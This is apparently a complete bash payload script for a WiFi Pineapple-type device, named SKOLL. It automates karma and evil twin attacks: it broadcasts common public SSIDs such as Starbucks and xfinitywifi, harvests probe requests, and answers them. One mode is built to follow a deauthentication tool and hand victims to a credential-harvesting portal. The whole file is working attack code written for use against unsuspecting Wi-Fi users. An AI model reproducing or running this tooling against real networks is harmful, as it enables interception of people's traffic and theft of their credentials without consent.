#!/bin/bash
# Title: SKOLL - Karma/Evil Twin Orchestrator
# Description: Automated SSID pool management and karma attack configuration
# Author: HaleHound
# Version: 1.0.0
# Category: user/attack
#
# Named after the wolf who chases the sun - SKOLL lures victims
# with familiar network names, drawing them into the trap
#
# Uses PINEAPPLE_SSID_POOL_* commands for SSID management
# Uses PINEAPPLE_*_FILTER_* commands for targeting
# Integrates with LOKI portal for credential harvesting

# === CONFIGURATION ===
LOOTDIR="/root/loot/skoll"
SSID_FILE="/root/loot/skoll/captured_ssids.txt"
INPUT=/dev/input/event0
SSID_CYCLE_DELAY=5          # Seconds between SSID changes when broadcasting
ORIGINAL_SSID=""            # Store original SSID for restoration

# Common SSIDs to seed the pool (high-value targets)
declare -a COMMON_SSIDS=(
    "xfinitywifi"
    "attwifi"
    "Starbucks WiFi"
    "Google Starbucks"
    "McDonald's Free WiFi"
    "NETGEAR"
    "linksys"
    "default"
    "Home WiFi"
    "Guest"
    "FreeWiFi"
    "Airport WiFi"
    "Hotel WiFi"
)

# === CLEANUP ===
cleanup() {
    # Restore original SSID if we changed it
    if [ -n "$ORIGINAL_SSID" ]; then
        uci set wireless.wlan0open.ssid="$ORIGINAL_SSID"
        uci commit wireless
        wifi reload 2>/dev/null &
    fi
    rm -f /tmp/skoll_running /tmp/skoll_status
    LED WHITE
}

trap cleanup EXIT INT TERM

# === PINEAP CHECK ===
check_pineap() {
    LOG "Checking PineAP status..."

    # Check if pineapd is running
    if ! pgrep -f pineapd >/dev/null 2>&1; then
        LOG ""
        LOG "ERROR: PineAP not running!"
        LOG ""

        local enable=$(CONFIRMATION_DIALOG "PineAP is not running!\n\nStart PineAP now?")
        if [ "$enable" = "1" ]; then
            LOG "Starting PineAP..."
            /etc/init.d/pineapd start 2>/dev/null
            sleep 3

            if pgrep -f pineapd >/dev/null 2>&1; then
                LOG "PineAP started!"
                return 0
            else
                LOG "Failed to start PineAP"
                ERROR_DIALOG "Could not start PineAP\n\nCheck Pager settings"
                return 1
            fi
        else
            LOG "PineAP required for SKOLL"
            return 1
        fi
    fi

    LOG "PineAP: OK"
    return 0
}

# === SSID BROADCAST FUNCTIONS ===

# Get current Open AP SSID
get_current_ssid() {
    uci get wireless.wlan0open.ssid 2>/dev/null
}

# Set Open AP SSID (actual broadcast)
set_broadcast_ssid() {
    local ssid="$1"
    uci set wireless.wlan0open.ssid="$ssid"
    uci commit wireless
    # Quick reload without full network restart
    hostapd_cli -i wlan0open set ssid "$ssid" 2>/dev/null || wifi reload 2>/dev/null &
}

# Broadcast SSIDs by cycling through them
broadcast_ssid_cycle() {
    local -n ssids=$1
    local delay=$2
    local idx=0
    local total=${#ssids[@]}

    LOG ""
    LOG "Broadcasting $total SSIDs (${delay}s each)"
    LOG "Press A to stop"
    LOG ""

    while true; do
        if check_for_stop; then
            return 0
        fi

        local current_ssid="${ssids[$idx]}"
        LOG "Broadcasting: $current_ssid"
        set_broadcast_ssid "$current_ssid"

        # Visual feedback
        play_capture
        led_luring

        # Wait with frequent stop checks (10x per second for responsiveness)
        local total_checks=$((delay * 10))
        local checked=0
        while [ $checked -lt $total_checks ]; do
            if check_for_stop; then
                return 0
            fi
            sleep 0.1
            checked=$((checked + 1))

            # Alternate LED every second
            if [ $((checked % 10)) -eq 0 ]; then
                local secs=$((checked / 10))
                if [ $((secs % 2)) -eq 0 ]; then
                    led_active
                else
                    led_luring
                fi
            fi
        done

        # Next SSID
        idx=$(( (idx + 1) % total ))
    done
}

# === LED PATTERNS ===
led_scanning() {
    LED CYAN
}

led_collecting() {
    LED AMBER
}

led_active() {
    LED GREEN
}

led_luring() {
    LED MAGENTA
}

led_error() {
    LED RED
}

# === SOUNDS ===
play_start() {
    RINGTONE "start:d=4,o=5,b=180:e,g,b" &
}

play_capture() {
    RINGTONE "cap:d=16,o=6,b=200:c,e" &
}

play_active() {
    RINGTONE "active:d=4,o=5,b=200:c,e,g,c6" &
}

play_stop() {
    RINGTONE "stop:d=4,o=4,b=120:e,c" &
}

# === CHECK FOR BUTTON PRESS ===
check_for_stop() {
    local data=$(timeout 0.1 dd if=$INPUT bs=16 count=1 2>/dev/null | hexdump -e '16/1 "%02x "' 2>/dev/null)
    [ -z "$data" ] && return 1

    local evtype=$(echo "$data" | cut -d' ' -f9-10)
    local evvalue=$(echo "$data" | cut -d' ' -f13)

    # Key press event (type=01, value=01)
    if [ "$evtype" = "01 00" ] && [ "$evvalue" = "01" ]; then
        return 0
    fi
    return 1
}

# === SSID POOL FUNCTIONS ===

# Clear the entire SSID pool
clear_pool() {
    LOG "Clearing SSID pool..."
    PINEAPPLE_SSID_POOL_CLEAR
    LOG "Pool cleared"
}

# Add SSIDs to pool
add_to_pool() {
    local ssid="$1"
    if [ -n "$ssid" ]; then
        PINEAPPLE_SSID_POOL_ADD "$ssid"
        LOG "Added: $ssid"
    fi
}

# Show current pool
show_pool() {
    LOG ""
    LOG "=== CURRENT SSID POOL ==="
    PINEAPPLE_SSID_POOL_LIST
    LOG ""
}

# Start SSID pool (karma mode)
start_karma() {
    local randomize=$1
    LOG "Starting karma mode..."
    if [ "$randomize" = "1" ]; then
        PINEAPPLE_SSID_POOL_START randomize
        LOG "Karma active (randomized)"
    else
        PINEAPPLE_SSID_POOL_START
        LOG "Karma active"
    fi
}

# Stop SSID pool
stop_karma() {
    LOG "Stopping karma mode..."
    PINEAPPLE_SSID_POOL_STOP
    LOG "Karma stopped"
}

# === SSID COLLECTION ===

# Start automatic SSID collection from probe requests
start_collection() {
    LOG "Starting SSID collection..."
    LOG "Collecting SSIDs from probe requests..."
    PINEAPPLE_SSID_POOL_COLLECT_START
    LOG "Collection active"
}

# Stop SSID collection
stop_collection() {
    LOG "Stopping SSID collection..."
    PINEAPPLE_SSID_POOL_COLLECT_STOP
    LOG "Collection stopped"
}

# === FILTER FUNCTIONS ===

# Set MAC filter mode
set_mac_filter_mode() {
    local mode=$1
    LOG "Setting MAC filter mode: $mode"
    PINEAPPLE_MAC_FILTER_MODE "$mode"
}

# Add MAC to filter
add_mac_filter() {
    local list=$1
    local mac=$2
    LOG "Adding MAC $mac to $list list"
    PINEAPPLE_MAC_FILTER_ADD "$list" "$mac"
}

# Clear MAC filter
clear_mac_filter() {
    local list=$1
    LOG "Clearing MAC $list list"
    PINEAPPLE_MAC_FILTER_CLEAR "$list"
}

# Set SSID filter mode
set_ssid_filter_mode() {
    local mode=$1
    LOG "Setting SSID filter mode: $mode"
    PINEAPPLE_SSID_FILTER_MODE "$mode"
}

# Add SSID to filter
add_ssid_filter() {
    local list=$1
    local ssid=$2
    LOG "Adding SSID '$ssid' to $list list"
    PINEAPPLE_SSID_FILTER_ADD "$list" "$ssid"
}

# === ATTACK MODES ===

# Mode 1: Quick Karma (pick one SSID to broadcast)
mode_quick_karma() {
    LOG ""
    LOG "=== QUICK KARMA ==="
    LOG "Pick an SSID to broadcast"
    LOG ""

    led_scanning

    # Save original SSID for restoration
    ORIGINAL_SSID=$(get_current_ssid)
    LOG "Current SSID: $ORIGINAL_SSID"
    LOG ""

    local count=${#COMMON_SSIDS[@]}

    # List SSIDs
    local i=1
    for ssid in "${COMMON_SSIDS[@]}"; do
        LOG "  $i. $ssid"
        i=$((i + 1))
    done
    LOG ""

    # Let user pick one
    local pick=$(NUMBER_PICKER "Select SSID (1-$count)" 1)
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            LOG "Cancelled"
            return 1
            ;;
    esac

    [ -z "$pick" ] && pick=1
    [ "$pick" -lt 1 ] && pick=1
    [ "$pick" -gt "$count" ] && pick=$count

    local selected_ssid="${COMMON_SSIDS[$((pick - 1))]}"

    LOG ""
    LOG "Selected: $selected_ssid"
    LOG ""

    # Confirm
    local confirm=$(CONFIRMATION_DIALOG "Broadcast '$selected_ssid'?\n\nThis will:\n- Change Open AP SSID\n- Seed karma pool\n- Lure victims")
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            LOG "Cancelled"
            return 1
            ;;
    esac

    if [ "$confirm" != "1" ]; then
        LOG "Cancelled"
        return 0
    fi

    # Set the broadcast SSID
    LOG "Setting broadcast SSID..."
    set_broadcast_ssid "$selected_ssid"

    # Seed the karma pool with ALL common SSIDs for probe responses
    clear_pool
    for ssid in "${COMMON_SSIDS[@]}"; do
        add_to_pool "$ssid"
    done
    start_karma "0"

    # Success!
    led_active
    play_active
    VIBRATE
    VIBRATE

    mkdir -p "$LOOTDIR"
    echo "Quick Karma: $selected_ssid $(date)" >> "$LOOTDIR/skoll.log"

    LOG ""
    LOG "========================================="
    LOG "  SKOLL ACTIVE"
    LOG "========================================="
    LOG ""
    LOG "  Broadcasting: $selected_ssid"
    LOG "  Karma pool: $count SSIDs"
    LOG ""
    LOG "  Victims will see '$selected_ssid'"
    LOG "  and karma responds to probes"
    LOG ""
    LOG "========================================="
    LOG ""

    # Ask what to do on exit
    local keep=$(CONFIRMATION_DIALOG "Keep broadcasting\n'$selected_ssid'\nafter exit?")

    if [ "$keep" = "1" ]; then
        # Keep broadcasting - clear original so cleanup doesn't restore
        ORIGINAL_SSID=""
        LOG "Karma will stay active!"
        LED GREEN
        play_active
    else
        # Restore original
        LOG "Restoring: $ORIGINAL_SSID"
        set_broadcast_ssid "$ORIGINAL_SSID"
        stop_karma
        ORIGINAL_SSID=""
        echo "Stopped, restored $(date)" >> "$LOOTDIR/skoll.log"
        play_stop
        LED WHITE
    fi

    LOG ""
}

# Mode 2: Passive Collection (gather SSIDs from probes)
mode_passive_collect() {
    LOG ""
    LOG "=== PASSIVE COLLECTION ==="
    LOG "Gathering SSIDs from probe requests"
    LOG ""

    led_collecting

    # Get collection duration
    local duration=$(NUMBER_PICKER "Collection duration (seconds)" 120)
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            LOG "Cancelled"
            return 1
            ;;
    esac

    # Start collection
    play_start
    VIBRATE
    start_collection

    LOG ""
    LOG "Collecting for $duration seconds..."
    LOG "Press A to stop early"
    LOG ""

    local elapsed=0
    while [ $elapsed -lt $duration ]; do
        if check_for_stop; then
            LOG "Stopped by user"
            break
        fi

        local remaining=$((duration - elapsed))
        LOG "[$remaining s] Collecting probe requests..."

        # Visual feedback
        play_capture
        led_collecting
        sleep 0.5
        led_scanning
        sleep 0.5

        elapsed=$((elapsed + 1))
    done

    # Stop collection
    stop_collection

    LOG ""
    LOG "=== COLLECTION COMPLETE ==="
    show_pool

    # Save collected SSIDs
    mkdir -p "$LOOTDIR"
    local timestamp=$(date +%Y%m%d_%H%M%S)
    PINEAPPLE_SSID_POOL_LIST > "$LOOTDIR/collected_${timestamp}.txt"
    LOG "Saved to: $LOOTDIR/collected_${timestamp}.txt"

    # Offer to start karma with collected SSIDs
    local start_karma=$(CONFIRMATION_DIALOG "Start Karma with collected SSIDs?")
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            return 0
            ;;
    esac

    if [ "$start_karma" = "1" ]; then
        led_active
        play_active
        VIBRATE

        start_karma "0"

        LOG ""
        LOG "SKOLL ACTIVE - Using collected SSIDs"
        LOG "Press A to stop"
        LOG ""

        while true; do
            if check_for_stop; then
                break
            fi
            led_luring
            sleep 0.5
            led_active
            sleep 0.5
        done

        stop_karma
        play_stop
    fi

    LED WHITE
    LOG "Passive collection complete"
}

# Mode 3: Aggressive Hunt (collect + karma simultaneously)
mode_aggressive() {
    LOG ""
    LOG "=== AGGRESSIVE HUNT ==="
    LOG "Continuous collection + karma"
    LOG ""

    led_scanning

    # Clear and seed with common SSIDs first
    local seed=$(CONFIRMATION_DIALOG "Seed pool with common SSIDs first?")
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            LOG "Cancelled"
            return 1
            ;;
    esac

    if [ "$seed" = "1" ]; then
        clear_pool
        for ssid in "${COMMON_SSIDS[@]}"; do
            add_to_pool "$ssid"
        done
        LOG "Seeded with ${#COMMON_SSIDS[@]} common SSIDs"
    fi

    # Start both collection and karma
    play_start
    VIBRATE

    start_collection
    sleep 0.5
    start_karma "0"

    led_luring
    play_active

    mkdir -p "$LOOTDIR"
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local logfile="$LOOTDIR/aggressive_${timestamp}.log"

    LOG "" | tee "$logfile"
    LOG "=== AGGRESSIVE MODE ACTIVE ===" | tee -a "$logfile"
    LOG "Started: $(date)" | tee -a "$logfile"
    LOG "" | tee -a "$logfile"
    LOG "- Collecting new SSIDs from probes" | tee -a "$logfile"
    LOG "- Broadcasting karma responses" | tee -a "$logfile"
    LOG "" | tee -a "$logfile"
    LOG "Press A to stop" | tee -a "$logfile"
    LOG "" | tee -a "$logfile"

    # Monitor
    local elapsed=0
    while true; do
        if check_for_stop; then
            LOG "Stopped by user" | tee -a "$logfile"
            break
        fi

        # Alternate LED colors
        if [ $((elapsed % 2)) -eq 0 ]; then
            led_luring
        else
            led_active
        fi

        elapsed=$((elapsed + 1))

        # Log status every 30 seconds
        if [ $((elapsed % 30)) -eq 0 ]; then
            LOG "[${elapsed}s] Aggressive mode running..." | tee -a "$logfile"
        fi

        sleep 1
    done

    # Stop everything
    stop_collection
    stop_karma
    play_stop

    LOG "" | tee -a "$logfile"
    LOG "=== HUNT COMPLETE ===" | tee -a "$logfile"
    LOG "Duration: ${elapsed}s" | tee -a "$logfile"
    LOG "Ended: $(date)" | tee -a "$logfile"

    # Save final pool
    PINEAPPLE_SSID_POOL_LIST >> "$logfile"
    PINEAPPLE_SSID_POOL_LIST > "$LOOTDIR/final_pool_${timestamp}.txt"

    LED WHITE
    VIBRATE

    ALERT "SKOLL HUNT COMPLETE\n\nDuration: ${elapsed}s\n\nSSIDs saved to:\n$LOOTDIR"
}

# Mode 4: Custom SSID entry
mode_custom() {
    LOG ""
    LOG "=== CUSTOM SSID SETUP ==="
    LOG ""

    # Show current pool
    show_pool

    LOG "Options:"
    LOG "1. Add SSID manually"
    LOG "2. Clear pool"
    LOG "3. Start Karma"
    LOG "4. Stop Karma"
    LOG "5. Back"
    LOG ""

    while true; do
        local choice=$(NUMBER_PICKER "Option (1-5)" 1)
        case $? in
            $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
                break
                ;;
        esac

        case $choice in
            1)
                LOG "Enter SSID to add:"
                local ssid=$(TEXT_INPUT "SSID name")
                case $? in
                    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
                        continue
                        ;;
                esac
                if [ -n "$ssid" ]; then
                    add_to_pool "$ssid"
                    VIBRATE 50
                fi
                ;;
            2)
                local confirm=$(CONFIRMATION_DIALOG "Clear entire SSID pool?")
                if [ "$confirm" = "1" ]; then
                    clear_pool
                    VIBRATE
                fi
                ;;
            3)
                start_karma "0"
                led_active
                play_active
                VIBRATE
                LOG "Karma STARTED"
                ;;
            4)
                stop_karma
                play_stop
                LED WHITE
                LOG "Karma STOPPED"
                ;;
            5)
                break
                ;;
        esac

        LOG ""
        show_pool
    done
}

# Mode 5: FENRIS Integration (post-deauth lure)
mode_fenris_chain() {
    LOG ""
    LOG "=== FENRIS CHAIN MODE ==="
    LOG "Optimized for post-deauth luring"
    LOG ""

    led_scanning

    # Instructions
    LOG "This mode is designed to run AFTER FENRIS:"
    LOG ""
    LOG "1. FENRIS deauths clients from target AP"
    LOG "2. SKOLL responds to their reconnect probes"
    LOG "3. Clients connect to your Evil Twin"
    LOG "4. LOKI harvests credentials"
    LOG ""

    local confirm=$(CONFIRMATION_DIALOG "Setup FENRIS chain mode?\n\nThis will:\n- Start probe collection\n- Enable karma responses\n- Wait for reconnecting clients")
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            LOG "Cancelled"
            return 1
            ;;
    esac

    if [ "$confirm" != "1" ]; then
        LOG "Cancelled"
        return 0
    fi

    # Start collection and karma
    play_start
    VIBRATE

    start_collection
    sleep 0.5
    start_karma "0"

    led_luring

    mkdir -p "$LOOTDIR"
    local timestamp=$(date +%Y%m%d_%H%M%S)

    LOG ""
    LOG "=== CHAIN MODE ACTIVE ==="
    LOG ""
    LOG "Ready for FENRIS deauth!"
    LOG "Responding to all probe requests..."
    LOG ""
    LOG "Press A when attack complete"
    LOG ""

    # Visual feedback loop
    while true; do
        if check_for_stop; then
            break
        fi

        # Hunting animation
        led_luring
        sleep 0.3
        led_active
        sleep 0.3
        led_collecting
        sleep 0.3
    done

    # Stop
    stop_collection
    stop_karma
    play_stop

    # Save results
    PINEAPPLE_SSID_POOL_LIST > "$LOOTDIR/chain_ssids_${timestamp}.txt"

    LED WHITE
    VIBRATE

    LOG ""
    LOG "Chain mode complete"
    LOG "SSIDs saved to: $LOOTDIR/chain_ssids_${timestamp}.txt"

    ALERT "FENRIS CHAIN COMPLETE\n\nCollected SSIDs saved.\n\nNext: Run LOKI portal\nto harvest credentials!"
}

# === MAIN ===

LOG ""
LOG " ___  _  __ ___  _     _     "
LOG "/ __|| |/ // _ \\| |   | |    "
LOG "\\__ \\| ' <| (_) | |__ | |__ "
LOG "|___/|_|\\_\\\\___/|____||____|"
LOG ""
LOG "   Karma Orchestrator v1.1"
LOG ""
LOG "The wolf chases the sun"
LOG ""

mkdir -p "$LOOTDIR"

# Check PineAP is running
if ! check_pineap; then
    LOG "Cannot run without PineAP"
    exit 1
fi

LOG ""

# Mode selection
LOG "Attack Mode:"
LOG "1. Quick Karma (common SSIDs)"
LOG "2. Passive Collection (gather probes)"
LOG "3. Aggressive Hunt (collect + karma)"
LOG "4. Custom Setup (manual control)"
LOG "5. FENRIS Chain (post-deauth)"
LOG ""

mode_choice=$(NUMBER_PICKER "Select mode (1-5)" 1)
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        LOG "Cancelled"
        exit 1
        ;;
esac

[ -z "$mode_choice" ] && mode_choice=1

case $mode_choice in
    1)
        mode_quick_karma
        ;;
    2)
        mode_passive_collect
        ;;
    3)
        mode_aggressive
        ;;
    4)
        mode_custom
        ;;
    5)
        mode_fenris_chain
        ;;
    *)
        LOG "Invalid mode"
        exit 1
        ;;
esac

LED WHITE
LOG ""
LOG "SKOLL payload complete"
